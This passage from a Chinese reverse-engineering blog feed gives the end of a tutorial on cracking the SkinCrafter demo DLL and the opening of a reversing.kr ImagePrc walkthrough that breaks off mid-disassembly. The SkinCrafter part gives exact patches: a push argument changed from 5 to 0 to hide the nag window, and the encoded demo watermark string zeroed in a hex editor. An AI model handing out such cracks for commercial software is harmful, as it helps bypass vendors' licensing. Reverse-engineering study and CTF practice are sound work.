&lt;p&gt;可以看到，函数执行完成之后会ShowWindow()，而当参数为5的时候，就是SW_SHOW，因此可以将push的参数设置为0(SW_HIDE)或者直接把整合函数nop掉。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2014-12-03更新：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;今天在项目上调试的时候发现又出现弹窗，使用相同的dll在皮肤测试程序上则没有出现。于是直接调试项目程序，发现还有几处ShowWindow函数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;10012B40  /$  55            push ebp
10012B41  |.  8BEC          mov ebp,esp
10012B43  |.  833D D45F0710&amp;gt;cmp dword ptr ds:[0x10075FD4],0x0
10012B4A  |.  56            push esi
10012B4B  |.  8BF1          mov esi,ecx
10012B4D  |.  75 42         jnz XSkinCraf.10012B91
10012B4F  |.  8B0D DC5F0710 mov ecx,dword ptr ds:[0x10075FDC]
10012B55  |.  6A 05         push 0x5
10012B57  |.  E8 22480400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
10012B5C  |.  8B0D DC5F0710 mov ecx,dword ptr ds:[0x10075FDC]
10012B62  |.  6A 00         push 0x0
10012B64  |.  6A 08         push 0x8
10012B66  |.  6A 00         push 0x0
10012B68  |.  E8 8B490400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ModifyStyle_7889&amp;gt;
10012B6D  |.  8B0D E05F0710 mov ecx,dword ptr ds:[0x10075FE0]
10012B73  |.  6A 05         push 0x5
10012B75  |.  E8 04480400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
10012B7A  |.  8B0D E45F0710 mov ecx,dword ptr ds:[0x10075FE4]
10012B80  |.  6A 05         push 0x5
10012B82  |.  E8 F7470400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
10012B87  |.  C705 D45F0710&amp;gt;mov dword ptr ds:[0x10075FD4],0x1
10012B91  |&amp;gt;  8B46 18       mov eax,dword ptr ds:[esi+0x18]
10012B94  |.  85C0          test eax,eax
10012B96  |.  74 74         je XSkinCraf.10012C0C
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可直接在OD的Name表中找出MFC的CWnd::ShowWindow函数调用处全部下断，此处连续出现3处ShowWindow()，将第一次出现处的&lt;code&gt;push 0x5&lt;/code&gt;改成&lt;code&gt;push 0x0&lt;/code&gt;即可。&lt;/p&gt;
&lt;h1&gt;去除标题栏DEMO字样&lt;/h1&gt;
&lt;p&gt;本以为这步会很简单，很可惜，低估了作者的智商。直接找字符串没看到SkinCrafter Demo字样，因此怀疑很可能字符串是被加密的了。OD调试Dll会加载LoadDll.exe这个程序，并在Dll加载后允许通过接口执行Dll的导出函数，对于一般作为函数库的Dll这样调试当然没问题，每个函数都是独立的，但是对于这种函数之间有数据依赖的Dll来说，我必须先调用几个依赖的函数，这样就过于麻烦了（主要懒得输那么长的参数，还要小端码，而且每次加载都要输入……）。这里就用到一个技巧，自己写一个调用dll的exe，直接调试exe，并进入Dll的领空找需要的东西。&lt;/p&gt;
&lt;p&gt;在OD的调试选项中，找到事件(Event)选项卡，把“中断于新模块”这项勾上，之后加载exe程序。每当exe加载一个dll的时候，就会被断下，F9继续执行，直到目标出现。当然SkinCrafterDll这个Dll是在程序中通过LoadLibrary()加载的，因此先要把程序跑起来。&lt;/p&gt;
&lt;p&gt;断下后进入该Dll领空，并查看所有函数符号。考虑到和绘图有关，并经过几次实验，最后定位在GdiPlus库中的GdipDrawString()函数上，直接下断函数。但是查找函数引用的时候却没有结果，这是因为Dll刚开始并没有填充IAT，所以需要再继续F9，直到IAT初始化完毕。再查找引用就可以找到函数调用处了。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;02E01511&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;53&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;                                             &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;hIcon&lt;/span&gt;
&lt;span class="nt"&gt;02E01512&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;0034E102&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.DestroyIcon&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;            &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;DestroyIcon&lt;/span&gt;
&lt;span class="nt"&gt;02E01518&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;8B9D&lt;/span&gt; &lt;span class="nt"&gt;54FFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.43&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E0151E&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;406CE102&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x2E16C40&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01523&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B15&lt;/span&gt; &lt;span class="nt"&gt;3C6CE102&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x2E16C3C&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01529&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B0D&lt;/span&gt; &lt;span class="nt"&gt;446CE102&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x2E16C44&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E0152F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8945&lt;/span&gt; &lt;span class="nt"&gt;E0&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.8&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;02E01532&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;4C6CE10&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x2E16C4C&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01538&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8955&lt;/span&gt; &lt;span class="nt"&gt;DC&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.9&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;
&lt;span class="nt"&gt;02E0153B&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B15&lt;/span&gt; &lt;span class="nt"&gt;486CE102&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x2E16C48&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01541&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;8945&lt;/span&gt; &lt;span class="nt"&gt;EC&lt;/span&gt;    &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x14&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ax&lt;/span&gt;
&lt;span class="nt"&gt;02E01545&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D45&lt;/span&gt; &lt;span class="nt"&gt;DC&lt;/span&gt;       &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.9&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01548&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;894D&lt;/span&gt; &lt;span class="nt"&gt;E4&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.7&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;02E0154B&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8955&lt;/span&gt; &lt;span class="nt"&gt;E8&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.6&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;
&lt;span class="nt"&gt;02E0154E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C9&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;02E01550&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D70&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt;       &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;02E017E5&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B8D&lt;/span&gt; &lt;span class="nt"&gt;64FFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.39&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E017EB&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;56&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;02E017EC&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;02E017ED&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B8D&lt;/span&gt; &lt;span class="nt"&gt;48FFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.46&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E017F3&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D95&lt;/span&gt; &lt;span class="nt"&gt;F8FEFFFF&lt;/span&gt; &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.66&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E017F9&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;52&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;
&lt;span class="nt"&gt;02E017FA&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B95&lt;/span&gt; &lt;span class="nt"&gt;6CFFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.37&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01800&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;02E01801&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;FF&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;-0x1&lt;/span&gt;
&lt;span class="nt"&gt;02E01803&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;02E01804&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;52&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;
&lt;span class="nt"&gt;02E01805&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;D26D0000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gdiplus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;GdipDrawString&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;02E0180A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B85&lt;/span&gt; &lt;span class="nt"&gt;64FFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.39&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01810&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;02E01811&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;846D0000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gdiplus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;GdipDeleteStringFormat&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;02E01816&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;56&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;02E01817&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;A66C0000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gdiplus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;GdipDeleteBrush&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;02E0181C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B8D&lt;/span&gt; &lt;span class="nt"&gt;48FFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.46&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E01822&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;02E01823&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;906D0000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gdiplus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;GdipDeleteFont&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;02E01828&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B95&lt;/span&gt; &lt;span class="nt"&gt;6CFFFFFF&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.37&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;02E0182E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;52&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;
&lt;span class="nt"&gt;02E0182F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C645&lt;/span&gt; &lt;span class="nt"&gt;FC&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt;    &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x1&lt;/span&gt;
&lt;span class="nt"&gt;02E01833&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;906C0000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gdiplus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;GdipDeleteGraphics&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;经过跟踪，可以发现字符串在DestroyIcon()执行之后被装入，在内存中显示为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;02E16C38  80 0F E0 02 54 6C 6E 69 44 75 66 61 73 62 75 27  €?TlniDufasbu&amp;#39;
02E16C48  43 62 6A 68 27 00 00 00 E4 D9 E1 02 A0 2B E0 02  Cbjh&amp;#39;...滟???
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;因此字符串为TlniDufasbu'Cbjh'，这个字符串经过后面的算法转换成了SkinCrafter Demo，因此只要直接干掉字符串就可以，或者nop掉GdipDrawString()。我采用删掉字符串的方法，用16进制编辑器打开dll找到这个字符串并填0。&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;从我使用的情况来看暂时没有出现其他问题，如果有破解不完全或造成错误的地方，我会在后续做出完善。另外，此次调试过程中全程在IDA中同步参考，IDA的图形视图能很好的看出程序的执行流程，当然IDA还有万恶的F5大杀器 :P&lt;/p&gt;</content><category term="SkinCrafter"></category><category term="crack"></category><category term="reversing"></category><category term="皮肤"></category><category term="破解"></category><category term="逆向"></category></entry><entry><title>reversing.kr ImagePrc Walkthrough</title><link href="http://blog.yyx.me/posts/reversing-kr-imageprc.html" rel="alternate"></link><published>2014-09-23T18:05:00-07:00</published><updated>2014-09-23T18:05:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-23:/posts/reversing-kr-imageprc.html</id><summary type="html">&lt;p&gt;本文为逆向工程练习网站reversing.kr中ImagePrc解题攻略。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;试玩&lt;/h1&gt;
&lt;p&gt;看起来很有意思的一道题目。拿到后打开一个窗口，可以用鼠标画一些东西，之后点Check，弹出“Wrong”。直觉认为应该是要画出一个图像，正确的话会得到flag。可惜这个图能画正确的概率真的很低。&lt;/p&gt;
&lt;h1&gt;逻辑分析&lt;/h1&gt;
&lt;p&gt;OD打开之后下MessageBoxA的API断点或者WM_LBUTTONUP的消息断点，点击Check后断下并跟踪到核心逻辑代码的位置。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;004012D6&lt;/span&gt;   &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;83BC24&lt;/span&gt; &lt;span class="nt"&gt;940000&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;cmp&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x94&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x64&lt;/span&gt;         &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;Case&lt;/span&gt; &lt;span class="nt"&gt;111&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;WM_COMMAND&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;switch&lt;/span&gt; 